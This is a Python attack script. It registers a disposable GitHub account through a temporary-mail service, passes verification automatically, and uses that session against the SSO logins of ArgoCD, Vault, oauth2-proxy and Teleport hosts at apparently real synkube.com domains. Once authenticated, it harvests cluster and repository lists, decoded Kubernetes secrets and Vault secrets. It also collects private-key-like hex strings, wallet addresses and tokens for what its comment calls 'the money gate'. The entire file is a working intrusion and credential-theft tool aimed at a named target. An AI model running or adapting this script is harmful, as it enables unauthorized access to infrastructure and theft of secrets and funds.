#!/usr/bin/env python3
# sso2.py - run from a clean egress (GitHub Actions runner).
# Goals: create an unflagged GitHub account, verify email properly, log in,
# then walk the four synkube SSO doors FAST + in parallel, harvesting everything.
# Strictly read-only against targets. <= ~55 HTTP requests total.
import os, re, sys, json, time, string, random, html as htmlmod, traceback
from urllib.parse import urljoin, urlparse, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor

try:
    from curl_cffi import requests as creq
    HAVE_CFFI = True
except Exception:
    import requests as creq
    HAVE_CFFI = False
import requests

T0 = time.time()
GH = "https://github.com"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
MAIL_API = "https://api.mail.tm"


def log(*a):
    print("[t=%05.1fs]" % (time.time() - T0), *a, flush=True)


def rnd(n=8, alpha=string.ascii_lowercase + string.digits):
    return "".join(random.choice(alpha) for _ in range(n))


def new_sess():
    if HAVE_CFFI:
        return creq.Session(impersonate="chrome")
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})
    return s


def ck_dict(s):
    try:
        return s.cookies.get_dict()
    except Exception:
        pass
    try:
        return dict(s.cookies)
    except Exception:
        return {}


def copy_cookies(ck, sess):
    for k, v in ck.items():
        try:
            sess.cookies.set(k, v, domain="github.com")
        except Exception:
            try:
                sess.cookies.set(k, v)
            except Exception:
                pass
    return sess


def text_of(h):
    if not h:
        return ""
    h = re.sub(r"<script.*?</script>|<style.*?</style>", " ", h, flags=re.S | re.I)
    h = re.sub(r"<[^>]+>", " ", h)
    h = htmlmod.unescape(h)
    return re.sub(r"\s+", " ", h).strip()


def inputs_of(h):
    out = []
    for m in re.finditer(r"<input\b[^>]*>", h or "", re.I):
        tag = m.group(0)
        nm = re.search(r'name="([^"]*)"', tag)
        val = re.search(r'value="([^"]*)"', tag)
        typ = re.search(r'type="([^"]*)"', tag)
        if nm:
            out.append({"name": htmlmod.unescape(nm.group(1)),
                        "value": htmlmod.unescape(val.group(1)) if val else "",
                        "type": (typ.group(1) if typ else "text")})
    return out


def form_action(h):
    m = re.search(r"<form\b[^>]*action=\"([^\"]*)\"", h or "", re.I)
    return htmlmod.unescape(m.group(1)) if m else None


def has_authorize_page(h):
    t = h or ""
    return ('/login/oauth/authorize' in t and re.search(r'name="authorize"', t) is not None) or \
           ('Authorize' in text_of(t) and 'client_id' in t and 'redirect_uri' in t)


def reqs(sess, meth, url, **kw):
    kw.setdefault("timeout", 45)
    kw.setdefault("allow_redirects", False)
    return getattr(sess, meth)(url, **kw)


# ------------------------- mail.tm -------------------------
def mail_new():
    s = requests.Session()
    s.headers.update({"Accept": "application/json", "Content-Type": "application/json"})
    dom = None
    for _ in range(3):
        try:
            r = s.get(MAIL_API + "/domains", timeout=25)
            arr = r.json().get("hydra:member", [])
            if arr:
                dom = arr[0]["domain"]; break
        except Exception as e:
            log("[mail] domains exc", repr(e)[:100]); time.sleep(1)
    if not dom:
        return None
    addr = "sso" + rnd(10) + "@" + dom
    pw = "Pw!" + rnd(18, string.ascii_letters + string.digits)
    r = s.post(MAIL_API + "/accounts", json={"address": addr, "password": pw}, timeout=25)
    log("[mail] create %s -> %s" % (addr, r.status_code))
    if r.status_code not in (200, 201):
        log("[mail] create body", r.text[:200]); return None
    r2 = s.post(MAIL_API + "/token", json={"address": addr, "password": pw}, timeout=25)
    if r2.status_code != 200:
        log("[mail] token", r2.status_code, r2.text[:160]); return None
    tok = r2.json().get("token")
    log("[mail] token_len=%s" % len(tok or ""))
    return {"address": addr, "password": pw, "token": tok}


def mail_msgs(tok):
    try:
        r = requests.get(MAIL_API + "/messages", headers={"Authorization": "Bearer " + tok}, timeout=25)
        return r.json().get("hydra:member", [])
    except Exception:
        return []


def mail_body(tok, mid):
    try:
        r = requests.get(MAIL_API + "/messages/" + mid, headers={"Authorization": "Bearer " + tok}, timeout=25)
        j = r.json()
        parts = [j.get("subject", ""), j.get("intro", "")]
        for p in (j.get("html") or []):
            parts.append(p)
        for p in (j.get("text") or []):
            parts.append(p if isinstance(p, str) else str(p))
        return "\n".join(parts)
    except Exception as e:
        return "EXC %r" % (e,)


def find_link(blob):
    m = re.search(r"https://github\.com/account_verifications/confirm/[A-Za-z0-9\-]+/[0-9]+", blob or "")
    if m:
        return m.group(0)
    m = re.search(r"https://github\.com/[^\s\"'<>]+", blob or "")
    return m.group(0) if m else None


def find_code(blob):
    t = text_of(blob)
    for m in re.finditer(r"\b(\d{8})\b", t):
        return m.group(1)
    for m in re.finditer(r"\b(\d{6})\b", t):
        return m.group(1)
    return None


def mail_wait(tok, seen, timeout=150, want="github"):
    t_end = time.time() + timeout
    while time.time() < t_end:
        msgs = mail_msgs(tok)
        for m in msgs:
            mid = m.get("id")
            if mid in seen:
                continue
            frm = ((m.get("from") or {}).get("address") or "")
            subj = m.get("subject", "")
            if want and want not in (frm + subj).lower() and "github" not in subj.lower():
                continue
            seen.add(mid)
            blob = mail_body(tok, mid)
            log("[mail] NEW from=%s subj=%r" % (frm, subj))
            return {"subject": subj, "blob": blob, "link": find_link(blob), "code": find_code(blob)}
        time.sleep(2)
    return None


# ------------------------- GitHub signup/login -------------------------
def gh_signup(sess, login, email, pw):
    r = sess.get(GH + "//signup", headers={"Accept": "text/html"}, timeout=45)
    log("[gh] GET //signup -> %s %s bytes=%s" % (r.status_code, r.url[:80], len(r.text)))
    h = r.text
    data = {}
    for i in inputs_of(h):
        if not i["name"]:
            continue
        if i["type"] in ("hidden",) or i["name"].startswith("required_field_") or i["name"] in ("authenticity_token", "timestamp", "timestamp_secret"):
            data[i["name"]] = i["value"]
    data["user[login]"] = login
    data["user[email]"] = email
    data["user[password]"] = pw
    data["user_signup[country]"] = "US"
    data["user_signup[marketing_consent]"] = "0"
    r2 = sess.post(GH + "//signup?social=false", data=data, headers={"Accept": "text/html"},
                   timeout=45, allow_redirects=False)
    loc = r2.headers.get("Location", "")
    log("[gh] POST //signup -> %s Location=%s" % (r2.status_code, loc[:120]))
    if r2.status_code != 302:
        log("[gh] signup body:", text_of(r2.text)[:400])
    return r2.status_code, loc


def gh_login(sess, login, pw, mb, seen):
    r = sess.get(GH + "//login", headers={"Accept": "text/html"}, timeout=45)
    h = r.text
    tok = ""
    for i in inputs_of(h):
        if i["name"] == "authenticity_token":
            tok = i["value"]; break
    log("[gh] login page %s token_len=%s" % (r.status_code, len(tok)))
    data = {"authenticity_token": tok, "login": login, "password": pw, "commit": "Sign in",
            "webauthn-conditional": "undefined", "javascript-support": "true"}
    r2 = sess.post(GH + "//session", data=data, headers={"Accept": "text/html"},
                   timeout=45, allow_redirects=False)
    loc = r2.headers.get("Location", "")
    log("[gh] POST //session -> %s Location=%s" % (r2.status_code, loc[:120]))
    if "verified-device" in loc or r2.status_code == 200 and "verified-device" in r2.text:
        p = sess.get(urljoin(GH, loc or "/sessions/verified-device"), headers={"Accept": "text/html"}, timeout=45)
        hh = p.text
        log("[gh] device page %s :: %s" % (p.status_code, text_of(hh)[:240]))
        act = form_action(hh) or "/sessions/verified-device"
        data2 = {}
        otp_name = None
        for i in inputs_of(hh):
            if not i["name"]:
                continue
            if i["type"] in ("text", "tel", "number", "password") or "otp" in i["name"].lower() or i["name"] == "code":
                otp_name = i["name"]; continue
            data2[i["name"]] = i["value"]
        m = mail_wait(mb["token"], seen, timeout=150)
        code = m["code"] if m else None
        log("[gh] device code=%s subj=%r" % (code, (m or {}).get("subject")))
        if code:
            data2[otp_name or "otp"] = code
            r3 = sess.post(urljoin(GH, act), data=data2, headers={"Accept": "text/html"},
                           timeout=45, allow_redirects=False)
            log("[gh] POST device -> %s Location=%s" % (r3.status_code, r3.headers.get("Location", "")[:120]))
            if r3.status_code in (301, 302, 303):
                sess.get(urljoin(GH, r3.headers.get("Location", "/")), timeout=45)
    return True


# ------------------------- door flows -------------------------
def follow_consent(sess, start, tag, maxhops=14, logf=log):
    hops = []
    cur = start
    for i in range(maxhops):
        try:
            r = reqs(sess, "get", cur, headers={"Accept": "text/html"})
        except Exception as e:
            hops.append(("EXC", cur[:100], repr(e)[:120])); logf("[%s] EXC %r" % (tag, e)); return None, None, hops
        loc = r.headers.get("Location", "") or ""
        hops.append((r.status_code, cur[:110], loc[:200]))
        logf("[%s] hop%d %s %s -> %s" % (tag, i, r.status_code, cur[:100], (loc or "")[:170]))
        if r.status_code in (301, 302, 303, 307, 308):
            cur = urljoin(cur, loc); continue
        h = r.text or ""
        if has_authorize_page(h):
            act = form_action(h) or "/login/oauth/authorize"
            data = {}
            for inp in inputs_of(h):
                if inp["name"]:
                    data[inp["name"]] = inp["value"]
            data.setdefault("authorize", "1")
            try:
                rp = sess.post(urljoin(GH, act), data=data, headers={"Accept": "text/html", "Referer": cur},
                               timeout=45, allow_redirects=False)
            except Exception as e:
                hops.append(("EXC", "consent", repr(e)[:120])); return None, None, hops
            loc2 = rp.headers.get("Location", "") or ""
            logf("[%s] POST consent -> %s loc=%s" % (tag, rp.status_code, loc2[:180]))
            return rp, loc2, hops
        # not redirect, not consent: terminal page
        body = text_of(h)[:300]
        logf("[%s] terminal %s %s :: %s" % (tag, r.status_code, r.url[:110], body[:200]))
        return r, None, hops
    return None, cur, hops


def walk_cb(sess, base, loc, tag, maxhops=6, logf=log):
    """follow redirect chain from consent POST; return (last status, final url, final text, chain)."""
    chain = []
    cur = urljoin(base, loc) if loc else None
    for i in range(maxhops):
        if not cur:
            break
        try:
            r = reqs(sess, "get", cur, headers={"Accept": "text/html"})
        except Exception as e:
            chain.append(("EXC", cur[:110], repr(e)[:120])); break
        l2 = r.headers.get("Location", "") or ""
        chain.append((r.status_code, cur[:110], l2[:170]))
        logf("[%s] cb%d %s %s -> %s" % (tag, i, r.status_code, cur[:100], (l2 or "")[:150]))
        if r.status_code in (301, 302, 303, 307, 308):
            cur = urljoin(cur, l2); continue
        return r.status_code, cur, text_of(r.text)[:600], chain, r
    return None, cur, "", chain, None


def door_argocd(sess, ck, shared):
    out = {"tag": "argocd"}
    base = "https://argocd.synkube.com"
    rp, loc, hops = follow_consent(sess, base + "/auth/login?return_url=" + quote(base + "/applications", safe=""), "argocd")
    out["hops"] = hops; out["post_status"] = getattr(rp, "status_code", None); out["loc"] = (loc or "")[:250]
    st, url, body, chain, _ = walk_cb(sess, base, loc, "argocd", logf=log)
    out["cb"] = chain; out["cb_final"] = [st, url[:160], body[:200] if st and st >= 400 else ""]
    ckd = ck_dict(sess)
    tok = ckd.get("argocd.token")
    out["has_token"] = bool(tok); out["token_prefix"] = (tok or "")[:30]
    if not tok:
        return out
    hdr = {"Authorization": "Bearer " + tok}
    try:
        me = sess.get(base + "/api/v1/account/me", headers=hdr, timeout=45)
        out["me"] = [me.status_code, me.text[:500]]
        stg = sess.get(base + "/api/v1/settings", headers=hdr, timeout=45)
        out["settings"] = [stg.status_code, stg.text[:200]]
        a = sess.get(base + "/api/v1/applications?limit=300", headers=hdr, timeout=90)
        out["apps_status"] = a.status_code
        j = a.json(); items = j.get("items", [])
        out["apps_count"] = len(items)
        apps = []
        for it in items:
            m = it.get("metadata", {}) or {}; sp = it.get("spec", {}) or {}
            src = sp.get("source", {}) or {}; srcs = sp.get("sources", []) or []
            dest = sp.get("destination", {}) or {}
            helm = src.get("helm") or {}
            apps.append({"name": m.get("name"), "ns": m.get("namespace"),
                         "repo": src.get("repoURL"), "chart": src.get("chart"), "path": src.get("path"),
                         "target_rev": src.get("targetRevision"),
                         "sources": [{"repo": x.get("repoURL"), "chart": x.get("chart"), "path": x.get("path")} for x in srcs][:4],
                         "helm_values": (helm.get("values") or "")[:300],
                         "dest_ns": dest.get("namespace"),
                         "health": ((it.get("status") or {}).get("health") or {}).get("status"),
                         "sync": ((it.get("status") or {}).get("sync") or {}).get("status")})
        out["apps"] = apps
        for ep in ("/api/v1/clusters", "/api/v1/repositories", "/api/v1/projects"):
            try:
                rr = sess.get(base + ep, headers=hdr, timeout=45)
                if rr.status_code == 200:
                    jj = rr.json()
                    its = jj.get("items", []) if isinstance(jj, dict) else []
                    if ep.endswith("repositories"):
                        out["repositories"] = [{"repo": x.get("repo"), "type": x.get("type"), "name": x.get("name")} for x in its][:40]
                    elif ep.endswith("clusters"):
                        out["clusters"] = [{"name": (x.get("name") or ""), "server": x.get("server"), "ns": (x.get("namespaces") or [])[:3]} for x in its][:20]
                    else:
                        out["projects"] = [x.get("metadata", {}).get("name") for x in its][:40]
                else:
                    out[ep] = [rr.status_code, rr.text[:120]]
            except Exception as e:
                out[ep] = "exc %r" % (e,)
        # live manifests for interesting apps (<=8 apps, <=2 req each)
        keys = {}
        cnt = 0
        for a0 in apps:
            nm = a0["name"] or ""
            if not re.search(r"signer|rsm|sequencer|sweep|api|platform|hypercall|synapse|vault|infra|dex|argocd|kms|worker|relay|oracle|payment|payout", nm, re.I):
                continue
            if cnt >= 8:
                break
            cnt += 1
            try:
                rr = sess.get(base + "/api/v1/applications/%s/managed-resources" % quote(nm),
                              params={"fields": "live"}, headers=hdr, timeout=60)
            except Exception as e:
                keys[nm] = "exc %r" % (e,); continue
            if rr.status_code != 200:
                keys[nm] = "status=%s" % rr.status_code; continue
            einfos = []
            try:
                jj = rr.json()
                for ritem in jj.get("items", []):
                    live = ritem.get("live") or {}
                    kind = live.get("kind"); name = (live.get("metadata") or {}).get("name")
                    spec = live.get("spec") or {}
                    tm = (spec.get("template") or {}) if isinstance(spec, dict) else {}
                    containers = ((tm.get("spec") or {}).get("containers") or []) if isinstance(tm, dict) else []
                    ek = []
                    for c in containers:
                        ek += ["env:" + e.get("name", "?") for e in (c.get("env") or [])]
                        for ef in (c.get("envFrom") or []):
                            ek.append("envFrom:" + json.dumps(ef, sort_keys=True)[:60])
                    vols = ((tm.get("spec") or {}).get("volumes") or []) if isinstance(tm, dict) else []
                    for v in vols:
                        sec = v.get("secret") or {}
                        if sec.get("secretName"):
                            ek.append("vol-secret:" + sec["secretName"])
                        cm = v.get("configMap") or {}
                        if cm.get("name"):
                            ek.append("vol-cm:" + cm["name"])
                    if isinstance(live.get("data"), dict):
                        ek += ["data:" + k for k in list(live["data"].keys())[:20]]
                    if isinstance(live.get("stringData"), dict):
                        ek += ["stringData:" + k for k in list(live["stringData"].keys())[:20]]
                    # capture small secret-like values: non-jwt strings 8..90 chars
                    vals = {}
                    if isinstance(live.get("data"), dict):
                        import base64 as b64
                        for k, v in list(live["data"].items())[:30]:
                            try:
                                dv = b64.b64decode(v).decode("utf-8", "replace")
                            except Exception:
                                continue
                            if 6 <= len(dv) <= 200 and re.match(r"^[A-Za-z0-9_\-\.:/@=]+$", dv):
                                vals[k] = dv[:160]
                    if ek or vals:
                        einfos.append({"kind": kind, "name": name, "keys": ek[:30], "vals": vals})
                        # register candidate tokens / addresses for the money gate
                        for v in vals.values():
                            if re.fullmatch(r"[0-9a-fA-F]{64}", v or ""):
                                shared.setdefault("hex64", set()).add(v.lower())
                            if v.startswith("0x") and len(v) == 42:
                                shared.setdefault("addr40", set()).add(v.lower())
                            if v.startswith("projects/") or re.match(r"^\d{10,14}$", v):
                                shared.setdefault("gcp_ids", set()).add(v)
                            if v.startswith("eyJ") and v.count(".") == 2:
                                shared.setdefault("jwts", set()).add(v)
                            if "key" in (list(vals.keys())[0] or "").lower():
                                pass
                keys[nm] = einfos[:60]
            except Exception as e:
                keys[nm] = "exc %r" % (e,)
        out["live_env"] = keys
    except Exception as e:
        out["api_exc"] = repr(e)[:300]
        out["api_tb"] = traceback.format_exc()[-600:]
    return out


def door_vault(sess, ck, shared):
    out = {"tag": "vault"}
    base = "https://vault.synkube.com"
    ui_cb = base + "/ui/vault/auth/oidc/oidc/callback"
    auth_url = None
    for body in ({"redirect_uri": ui_cb}, {"role": "human", "redirect_uri": ui_cb},
                 {"role": "default", "redirect_uri": ui_cb}):
        try:
            r = sess.post(base + "/v1/auth/oidc/oidc/auth_url", json=body, timeout=45)
        except Exception as e:
            out.setdefault("auth_url_tries", []).append({"body": body, "exc": repr(e)[:120]}); continue
        entry = {"body": body, "status": r.status_code}
        if r.status_code == 200:
            try:
                j = r.json(); auth_url = (j.get("data") or {}).get("auth_url")
            except Exception:
                entry["body_txt"] = r.text[:200]
        else:
            entry["body_txt"] = r.text[:200]
        out.setdefault("auth_url_tries", []).append(entry)
        if auth_url:
            break
    out["auth_url"] = (auth_url or "")[:260]
    if not auth_url:
        return out
    rp, loc, hops = follow_consent(sess, auth_url, "vault")
    out["hops"] = hops; out["post_status"] = getattr(rp, "status_code", None); out["loc"] = (loc or "")[:250]
    st, url, body, chain, last = walk_cb(sess, "https://dex.synkube.com", loc, "vault", maxhops=8)
    out["cb"] = chain; out["cb_final"] = [st, (url or "")[:200], body]
    code = state = None
    if url:
        q = parse_qs(urlparse(url).query)
        code = (q.get("code") or [None])[0]; state = (q.get("state") or [None])[0]
    out["has_code"] = bool(code)
    if not code:
        if last is not None:
            out["err_page"] = text_of(last.text)[:300]
        return out
    try:
        cb = sess.post(base + "/v1/auth/oidc/oidc/callback", json={"code": code, "state": state}, timeout=45)
    except Exception as e:
        out["cb_exc"] = repr(e)[:200]; return out
    out["cb_status"] = cb.status_code; out["cb_body"] = cb.text[:300]
    if cb.status_code != 200:
        return out
    ct = (cb.json().get("auth") or {}).get("client_token")
    out["token_len"] = len(ct or "")
    h = {"X-Vault-Token": ct or ""}
    try:
        ls = sess.get(base + "/v1/auth/token/lookup-self", headers=h, timeout=45)
        d = (ls.json() or {}).get("data", {}) if ls.status_code == 200 else {}
        out["lookup"] = {"policies": d.get("policies"), "ttl": d.get("ttl"), "display": d.get("display_name"),
                         "meta": {k: str(v)[:80] for k, v in (d.get("meta") or {}).items()}}
        mt = sess.get(base + "/v1/sys/internal/ui/mounts", headers=h, timeout=45)
        mounts = {}
        if mt.status_code == 200:
            mounts = ((mt.json() or {}).get("data", {}) or {}).get("secret", {}) or {}
        out["mounts"] = sorted(mounts.keys())
        meta = {}
        for mp in list(mounts.keys()):
            if mp.startswith(("cubbyhole/", "identity/", "sys/")):
                continue
            try:
                lr = sess.get(base + "/v1/" + mp.strip("/") + "/metadata", params={"list": "true"}, headers=h, timeout=45)
            except Exception as e:
                meta[mp] = "exc"; continue
            if lr.status_code == 200:
                try:
                    meta[mp] = (lr.json().get("data") or {}).get("keys")
                except Exception:
                    meta[mp] = lr.text[:120]
            elif lr.status_code == 404:
                meta[mp] = "kv-v1-or-empty"
            else:
                meta[mp] = "status=%s" % lr.status_code
        out["mount_meta"] = meta
        interesting = ["signer", "rsm", "sequencer", "kms", "platform", "hypercall", "synapse", "cloudflare",
                       "infisical", "privy", "sweep", "google", "gcp", "deploy", "ci", "app", "api", "rpc",
                       "db", "postgres", "mysql", "redis", "prod", "staging"]
        got = {}
        tried = 0
        for mp, keys in meta.items():
            if not isinstance(keys, list):
                continue
            for k in keys:
                if tried >= 20:
                    break
                kl = (k or "").lower()
                if any(n in kl for n in interesting) or len(keys) <= 6:
                    try:
                        rr = sess.get(base + "/v1/" + mp.strip("/") + "/data/" + k.rstrip("/"), headers=h, timeout=45)
                    except Exception as e:
                        got[mp + ":" + k] = "exc"; continue
                    tried += 1
                    if rr.status_code == 200:
                        try:
                            dd = (rr.json().get("data") or {}).get("data") or {}
                            shape = {}
                            for kk, vv in dd.items():
                                sv = str(vv)
                                shape[kk] = sv[:60]
                                if re.fullmatch(r"[0-9a-fA-F]{64}", sv):
                                    shared.setdefault("hex64", set()).add(sv.lower())
                                if sv.startswith("0x") and len(sv) == 42:
                                    shared.setdefault("addr40", set()).add(sv.lower())
                                if sv.startswith("eyJ") and sv.count(".") == 2:
                                    shared.setdefault("jwts", set()).add(sv)
                                if sv.startswith("projects/"):
                                    shared.setdefault("gcp_ids", set()).add(sv)
                            got[mp + ":" + k] = shape
                        except Exception:
                            got[mp + ":" + k] = rr.text[:120]
                    elif rr.status_code == 404 and mp.endswith("/"):
                        pass
                    else:
                        got[mp + ":" + k] = "status=%s" % rr.status_code
                if tried >= 20:
                    break
            if tried >= 20:
                break
        out["secrets_sample"] = got
    except Exception as e:
        out["api_exc"] = repr(e)[:300]
    return out


def door_o2p(sess, ck, shared):
    out = {"tag": "o2p"}
    base = "https://auth.synkube.com"
    rp, loc, hops = follow_consent(sess, base + "/oauth2/start?rd=%2F", "o2p")
    out["hops"] = hops; out["post_status"] = getattr(rp, "status_code", None); out["loc"] = (loc or "")[:250]
    st, url, body, chain, last = walk_cb(sess, base, loc, "o2p", maxhops=5)
    out["cb"] = chain; out["cb_final"] = [st, (url or "")[:200], body[:400]]
    ck2 = ck_dict(sess)
    out["cookies"] = {k: v[:20] for k, v in ck2.items() if "oauth" in k}
    out["has_cookie"] = any(k.startswith("_oauth2_proxy") and "csrf" not in k for k in ck2)
    if out["has_cookie"]:
        try:
            r = sess.get(base + "/oauth2/userinfo", timeout=45)
            out["userinfo"] = [r.status_code, r.text[:300]]
        except Exception as e:
            out["userinfo"] = "exc %r" % (e,)
    return out


def door_teleport(sess, ck, shared):
    out = {"tag": "teleport"}
    base = "https://teleport.synkube.com"
    try:
        p = sess.get(base + "/webapi/ping", timeout=45)
        out["ping"] = [p.status_code, p.text[:200]]
    except Exception as e:
        out["ping"] = "exc %r" % (e,)
    start = base + "/v1/webapi/github/login/web?connector_id=github&redirect_url=%2Fweb%2Fclusters"
    rp, loc, hops = follow_consent(sess, start, "teleport")
    out["hops"] = hops; out["post_status"] = getattr(rp, "status_code", None); out["loc"] = (loc or "")[:250]
    st, url, body, chain, last = walk_cb(sess, base, loc, "teleport", maxhops=6)
    out["cb"] = chain; out["cb_final"] = [st, (url or "")[:250], body[:400]]
    ck2 = ck_dict(sess)
    out["cookies"] = {k: v[:20] for k, v in ck2.items() if "grv" in k or "teleport" in k}
    return out


# ------------------------- main -------------------------
def main():
    res = {"started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
    try:
        r = requests.get("https://api.ipify.org", timeout=20)
        res["egress"] = r.text.strip()
    except Exception:
        res["egress"] = "?"
    log("EGRESS", res["egress"])
    mb = mail_new()
    res["mailbox"] = {"address": (mb or {}).get("address"), "password": (mb or {}).get("password")}
    if not mb:
        print(json.dumps(res)); return
    seen = set()
    for m in mail_msgs(mb["token"]):
        seen.add(m.get("id"))
    login = "sso" + rnd(10, string.ascii_lowercase + string.digits)
    pw = "Pw-" + rnd(15, string.ascii_letters + string.digits) + "!" + rnd(3, string.digits)
    res["identity"] = {"login": login, "password": pw, "email": mb["address"]}
    log("[gh] new identity: %s / %s" % (login, mb["address"]))
    s = new_sess()
    try:
        st, loc = gh_signup(s, login, mb["address"], pw)
        res["signup"] = [st, loc[:120]]
        t_signup = time.time()
        m = mail_wait(mb["token"], seen, timeout=150)
        res["mail_launch"] = {"subject": (m or {}).get("subject"), "code": (m or {}).get("code"), "link": (m or {}).get("link")}
        log("[gh] launch mail code=%s link=%s" % ((m or {}).get("code"), (m or {}).get("link")))
        # verify email via confirm link (works even not logged in)
        if m and m.get("link"):
            try:
                r = s.get(m["link"], headers={"Accept": "text/html"}, timeout=45)
                log("[gh] confirm link -> %s final=%s" % (r.status_code, r.url[:100]))
                res["confirm"] = [r.status_code, r.url[:120]]
            except Exception as e:
                log("[gh] confirm exc", repr(e)[:120])
        # login
        gh_login(s, login, pw, mb, seen)
        ck = ck_dict(s)
        res["login"] = {"logged_in": ck.get("logged_in"), "user_session": bool(ck.get("user_session")), "dotcom_user": ck.get("dotcom_user")}
        log("[gh] LOGGED_IN=%s USER_SESSION=%s user=%s" % (ck.get("logged_in"), bool(ck.get("user_session")), ck.get("dotcom_user")))
        # verify email via launch code page (in-session)
        try:
            av = s.get(GH + "/account_verifications", headers={"Accept": "text/html"}, timeout=45)
            log("[gh] /account_verifications -> %s %s" % (av.status_code, av.url[:90]))
            res["acct_verif"] = [av.status_code, av.url[:100]]
            if av.status_code == 200 and "/account_verifications" in av.url:
                hh = av.text
                act = form_action(hh) or "/account_verifications"
                data = {}
                otp_name = None
                for i in inputs_of(hh):
                    if not i["name"]:
                        continue
                    if "code" in i["name"].lower() or "otp" in i["name"].lower():
                        otp_name = i["name"]; continue
                    data[i["name"]] = i["value"]
                code = (m or {}).get("code")
                if code:
                    data[otp_name or "launch_code[]"] = code
                    r3 = s.post(urljoin(GH, act), data=data, headers={"Accept": "text/html", "Referer": av.url},
                                timeout=45, allow_redirects=False)
                    log("[gh] POST launch_code(%s) -> %s Location=%s" % (otp_name or "launch_code[]", r3.status_code, r3.headers.get("Location", "")[:90]))
                    res["acct_verif_post"] = [r3.status_code, r3.headers.get("Location", "")[:120]]
        except Exception as e:
            log("[gh] acct_verif exc", repr(e)[:150])
        # settings/emails status
        try:
            em = s.get(GH + "/settings/emails", headers={"Accept": "text/html"}, timeout=45)
            t = text_of(em.text)
            log("[emails] %s %s :: %s" % (em.status_code, em.url[:90], t[:500]))
            res["emails"] = {"status": em.status_code, "url": em.url[:100], "text": t[:900],
                             "marks": [k for k in ("Unverified", "unverified", "Please verify", "Verified", "Primary") if k in t]}
        except Exception as e:
            log("[emails] exc", repr(e)[:150])
        # anonymous oracle
        try:
            o = requests.get("https://api.github.com/users/" + login, timeout=25)
            res["oracle"] = [o.status_code, (o.json().get("public_repos") if o.status_code == 200 else o.text[:100])]
            log("[flag:oracle] %s -> %s" % (login, o.status_code))
        except Exception as e:
            log("[oracle] exc", repr(e)[:120])
        # consent probes
        AUTHZ = {
            "argocd": "https://github.com/login/oauth/authorize?client_id=Ov23li7NNAWxA2km8xXo&redirect_uri=https%3A%2F%2Fargocd.synkube.com%2Fapi%2Fdex%2Fcallback&response_type=code&scope=user%3Aemail&state=ip335126",
            "o2p": "https://github.com/login/oauth/authorize?client_id=Ov23liemtbdvqJCj1Dzs&redirect_uri=https%3A%2F%2Fauth.synkube.com%2Foauth2%2Fcallback&response_type=code&scope=user%3Aemail+read%3Aorg&state=ip335126",
        }
        res["consent"] = {}
        for tag, u in AUTHZ.items():
            try:
                r = s.get(u, headers={"Accept": "text/html"}, timeout=45)
                t = text_of(r.text)
                res["consent"][tag] = {"status": r.status_code, "consent": has_authorize_page(r.text),
                                       "flagged": "cannot authorize a third party" in t,
                                       "snippet": t[:180]}
                log("[flag:%s] %s consent=%s flagged=%s" % (tag, r.status_code, res["consent"][tag]["consent"], res["consent"][tag]["flagged"]))
            except Exception as e:
                res["consent"][tag] = "exc %r" % (e,)
        # ---- four doors in parallel with the SAME authenticated github session cookies ----
        shared = {}
        tdoors = time.time()
        log("[doors] launching 4 parallel flows at t+%.1fs after signup" % (tdoors - t_signup))
        ck = ck_dict(s)
        keep = {k: v for k, v in ck.items() if k in ("user_session", "__Host-user_session_same_site", "_gh_sess", "logged_in",
                                                     "dotcom_user", "preferred_color_mode", "tz", "has_recent_activity")}

        def mk():
            return copy_cookies(keep, new_sess())
        jobs = [("argocd", door_argocd, mk()), ("vault", door_vault, mk()),
                ("o2p", door_o2p, mk()), ("teleport", door_teleport, mk())]
        with ThreadPoolExecutor(max_workers=4) as ex:
            futs = {ex.submit(fn, sess, ck, shared): name for (name, fn, sess) in jobs}
            for f in futs:
                nm = futs[f]
                try:
                    res["door_" + nm] = f.result(timeout=240)
                except Exception as e:
                    res["door_" + nm] = {"exc": repr(e)[:300]}
        log("[doors] done at t+%.1fs after signup" % (time.time() - t_signup))
        res["dup"] = {k: sorted(v)[:30] for k, v in shared.items()}
        res["elapsed_s"] = round(time.time() - T0, 1)
    except Exception as e:
        res["EXC"] = repr(e)[:400]
        res["TB"] = traceback.format_exc()[-1200:]
    print("\n=====RESULT_JSON_BEGIN=====")
    print(json.dumps(res, indent=1, default=str)[:120000])
    print("=====RESULT_JSON_END=====")


if __name__ == "__main__":
    main()
